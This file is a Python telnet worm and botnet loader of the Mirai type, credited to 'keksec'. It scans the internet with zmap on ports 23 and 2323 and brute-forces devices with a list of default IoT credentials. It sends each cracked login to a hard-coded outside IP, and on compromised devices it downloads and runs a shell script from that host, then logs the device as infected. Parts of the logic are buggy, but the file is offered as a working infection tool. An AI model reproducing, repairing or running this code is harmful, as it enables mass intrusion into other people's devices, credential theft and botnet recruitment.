#!/usr/bin/python
# original code by freak/keksec or whatever ;), ily
import threading, sys, os, time, socket, select, subprocess
# USE ONLY 1 TO 16 THREADS UNLESS U WANNA CRASH UR SERVER

if len(sys.argv) < 3:
    print(f"Usage: python {sys.argv[0]} <threads> <output file>")
    exit()

rekdevice = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; curl http://198.144.190.116/update.sh -O; busybox curl http://198.144.190.116/update.sh -O; wget http://198.144.190.116/update.sh -O update.sh; busybox wget http://198.144.190.116/update.sh -O update.sh; sh update.sh; rm -rf update.sh"
combo = [ 
        "root:root",
        "root:n/a",
        "admin:admin",
        "telnet:telnet",
        "support:support",
        "user:user",
        "admin:n/a",
        "admin:password",
        "root:vizxv",
        "root:admin",
        "root:xc3511",
        "root:888888",
        "root:xmhdipc",
        "root:default",
        "root:juantech",
        "root:123456",
        "root:54321",
        "root:12345",
        "root:pass",
        "ubnt:ubnt",
        "root:klv1234",
        "root:Zte521",
        "root:hi3518",
        "root:jvbzd",
        "root:anko",
        "root:zlxx.",
        "root:7ujMko0vizxv",
        "root:7ujMko0admin",
        "root:system",
        "root:ikwb",
        "root:dreambox",
        "root:user",
        "root:realtek",
        "root:00000000",
        "admin:1111111",
        "admin:1234",
        "admin:12345",
        "admin:54321",
        "admin:123456",
        "admin:7ujMko0admin",
        "admin:1234",
        "admin:pass",
        "admin:meinsm",
        "admin:admin1234",
        "root:1111",
        "admin:smcadmin",
        "admin:1111",
        "root:666666",
        "root:password",
        "root:1234",
        "root:klv123",
        "Administrator:admin",
        "service:service",
        "supervisor:supervisor",
        "guest:guest",
        "guest:12345",
        "guest:12345",
        "admin1:password",
        "administrator:1234",
        "666666:666666",
        "888888:888888",
        "tech:tech"
]

threads = int(sys.argv[1])
output_file = sys.argv[2]

lock = threading.Lock()
def pwrap(text):
    with lock:
        print(text)

def readUntil(tn, string, timeout=8):
    buf = ''

    start_time = time.time()
    while time.time() - start_time < timeout:
        buf += tn.recv(1024)
        time.sleep(0.1)
        if string in buf: return buf
        
    pass

def recvTimeout(sock, size, timeout=8):
    sock.setblocking(0)
    ready = select.select([sock], [], [], timeout)
    
    if ready[0]:
        data = sock.recv(size)
        return data
    return ""

running = 0
maxthreads = 1024

class router(threading.Thread):
    def __init__ (self, ip):
        threading.Thread.__init__(self)
        self.ip = str(ip).rstrip('\n')

        self.tn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.tn.settimeout(1)

    def run(self):
        global running
        global maxthreads

        running += 1

        global fh

        port = 23
        username = ""
        password = ""

        for passwd in combo:
            user, passw = passwd.split(':')
            if "n/a" in passw: password = ""
            if "n/a" in user: username = ""

            try:
                self.tn.connect((self.ip, 23)); port = 23
            except Exception:
#                self.tn.close()
                break
            
            try:
                self.tn.connect((self.ip, 2323)); port = 2323
            except Exception:
#                self.tn.close()
                break

            try:
                hoho = ''
                hoho += readUntil(self.tn, ":")

                if ":" in hoho:
                    self.tn.send(username + "\r\n")
                    time.sleep(0.1)
                else:
                    self.tn.close()
                    running -= 1
                    return

                hoho = ''
                hoho += readUntil(self.tn, ":")

                if ":" in hoho:
                    self.tn.send(password + "\r\n")
                    time.sleep(0.1)

                prompt = ''
                prompt += recvTimeout(self.tn, 40960)

                if "#" in prompt or "$" in prompt:
                    for bad in ["nvalid", "ailed", "ncorrect", "enied", "error", "goodbye", "bad", "timeout", "##"]:
                        if bad in prompt.lower():
                            pwrap("\033[32m[\033[31m+\033[32m] \033[31mFAILED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))
                            self.tn.close()
                            continue

                    success = True
                else:
                    success = False
                    self.tn.close()

                if success:
                    try:
                        pwrap("\033[32m[\033[31m+\033[32m] \033[33mGOTCHA \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))

                        fh.write(f'{self.ip}:{str(port)}{username}:{password}\n')
                        fh.flush()

                        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        s.connect(("198.144.190.116", 8080))
                        s.send(f'{self.ip}:{str(port)}{username}:{password}\n')
                        s.close()

                        self.tn.send("sh\r\n")
                        time.sleep(0.1)

                        self.tn.send("shell\r\n")
                        time.sleep(0.1)
                        self.tn.send("ls /\r\n")

                        time.sleep(1)
                        timeout = 8

                        buf = ''
                        start_time = time.time()
                        while time.time() - start_time < timeout:
                            buf += recvTimeout(self.tn, 40960)
                            time.sleep(0.1)

                            if "tmp" in buf and "unrecognized" not in buf:
                                self.tn.send(rekdevice + "\r\n")
                                
                                pwrap("\033[32m[\033[31m+\033[32m] \033[33mINFECTED \033[31m-> \033[32m%s\033[37m:\033[33m%s\033[37m:\033[32m%s\033[37m" % (username, password, self.ip))
                                
                                f = open("infected.txt", "a", (2048*2048))
                                f.write(f'{self.ip}:{str(port)}{username}:{password}\n')
                                f.close()

                                time.sleep(10)

                                self.tn.close()
                                running -= 1

                                return
                        self.tn.close()
                        running -= 1

                        return
                    except:
                         pass
#                        self.tn.close()
                else:
                     pass
#                    self.tn.close()
            except:
                 pass
#                self.tn.close()
            running -= 1

def worker():
    while 1:
        cmd = "zmap -p23,2323 -N 1024 -f saddr -q --verbosity=0 -c -o -"
        process = subprocess.Popen(cmd.split(" "), stdout=subprocess.PIPE)

        for line in iter(process.stdout.readline, b''):
            while running >= maxthreads:
                time.sleep(0.1)

            try:
                thread = router(line.rstrip())
                thread.start()
            except:
                pass

fh = open(output_file, "a", (2048*2048))
for _ in range(threads):
    try:
        t = threading.Thread(target=worker)
        t.start()
    except:
        pass

print(f"Started {str(threads)} scanner threads! Press enter to stop.")

input()
os.kill(os.getpid(), 9)
